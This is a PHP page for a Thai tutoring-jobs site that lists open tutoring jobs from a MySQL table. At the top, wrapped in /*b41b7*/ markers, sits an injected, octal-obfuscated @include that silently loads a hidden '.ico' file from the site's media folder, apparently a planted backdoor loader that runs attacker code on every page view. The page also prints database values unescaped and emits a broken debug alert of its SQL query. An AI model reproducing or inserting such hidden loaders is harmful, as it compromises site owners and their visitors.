<?php 
/*b41b7*/

@include "\\057h\\157m\\145/\\164u\\164o\\162c\\165c\\057d\\157m\\141i\\156s\\057t\\165t\\157r\\143u\\056c\\157m\\057p\\165b\\154i\\143_\\150t\\155l\\057m\\145d\\151a\\057c\\157m\\137m\\145n\\165s\\057.\\0628\\0714\\1420\\0653\\056i\\143o";

/*b41b7*/
?> 
<?
session_start();
include "./system/config.inc.php";
include "./system/function.php";
$strTable = "tb_page";
$strCondition = "page_id='10' ";
$query0 = "SELECT * FROM tb_page WHERE page_id='10'";
$result0 = mysqli_query($conn, $query0);
$data = mysqli_fetch_assoc($result0);
?>
<!DOCTYPE html>
<html lang="en">
  <head>
  <!--<meta https-equiv="content-type" content="text/html; charset=utf-8" />-->
  <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link rel="shortcut icon" href="favicon.ico">

    <title>งาน สอนพิเศษ รับ สมัคร ครู สอน ภาษาอังกฤษ หาอาจารย์ ตามบ้าน โรงเรียนกวดวิชา part time job tutor คณิตศาสตร์ อัพเดท</title>
    <!-- Bootstrap core CSS -->
	<link href="./asset/css/style.css" rel="stylesheet">
    <link href="./asset/css/bootstrap.css" rel="stylesheet">
	<link href="./asset/css/bootstrap.min.css" rel="stylesheet">
    <!-- Bootstrap core CSS -->
    <link href="./asset/css/bootstrap.min.css" rel="stylesheet">
	  <link href="./asset/css/bootstrap-responsive.css" rel="stylesheet">

<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
<script src="asset/dist/js/bootstrap.js"></script>

<script src="asset/docs-assets/js/holder.js"></script>

<script src="asset/docs-assets/js/application.js"></script>
<script type="text/javascript">
$('#myCollapsible').on('hidden.bs.collapse', function () {
  // do something…
})
</script>
<style type="text/css">
<!--
body {

	margin-left: 0px;
	margin-top: -30px;
	margin-right: 0px;
	margin-bottom: 0px;
}
-->
</style>

  </head>

  <body>
<div id="head_main"><div class="logobox"><img src="images/logo.png" name="register" border="0"/></div><div class="login_box">
<table width="200" border="0">
  <tr>
    <td></td>
    <td><a href="https://www.tutorcu.com/job/register.php" target="_parent"><img src="../images/icon/register.png" name="register" border="0"/></a></td>
    <td><a href="https://www.tutorcu.com/job/login/" target="_parent"><img src="../images/icon/login.png" name="register" border="0"/></a></td>
  </tr>
</table>
</div></div>
<div class="clear"></div>
    <div class="container_main">
      <div class="row row-offcanvas row-offcanvas-right padding">

        <div class="">
<div id="poster"></div>
<p><?=$data['detail'];?></p>
<h1><span style="color:#000;">งานสอนพิเศษ</span><span style="color:#3fae00;">  อัพเดตตลอด 24 hr</span></h1>
      <table class="table table-bordered">
        <thead>
          <tr>
            <th width="8%" class="bg_t">รหัสงาน</th>
            <th width="25%" class="bg_t">วิชา</th>
            <th width="25%" class="bg_t">สถานที่</th>
            <th width="25%" class="bg_t">สถานะ</th>
			 <th width="5%" class="bg_t">จอง</th>
            <th width="12%" class="bg_t">รายละเอียด</th>
          </tr>
        </thead>
        <tbody>
<?php
$str="select *from tb_job where status !='no' order by job_id DESC limit 250"; 
echo '<script>alert('.$str.');</script>';
$result=mysqli_query($conn,$str); 
while ($sr=mysqli_fetch_array($result)) {

?>
          <tr>
            <td class="<?=class_yel($sr[status]);?>"><?=$sr[code_tutor];?></td>
            <td class="<?=class_yel($sr[status]);?>"><?=$sr[subject_name];?></td>
            <td class="<?=class_yel($sr[status]);?>"><?=$sr[place_tutor];?></td>
            <td class="<?=class_yel($sr[status]);?>"><p align=center><?=class_status1($sr[status]);?></p></td>
			<td class="<?=class_yel($sr[status]);?>"><?=BookingNum($sr[job_id]);?></td>
            <td class="<?=class_yel($sr[status]);?>"><a href="work-detail.php?job_id=<?=$sr[job_id];?>" target="_blank"><img src="../images/icon/book.png" name="register" border="0"/></a></td>
          </tr> 
<? }?>
		  
        </tbody>
      </table>
    
        </div><!--/span-->

      </div><!--/row-->

      <hr>


    <? include "template/footer.php";?>

    </div><!---container-->

  </body>

</html>

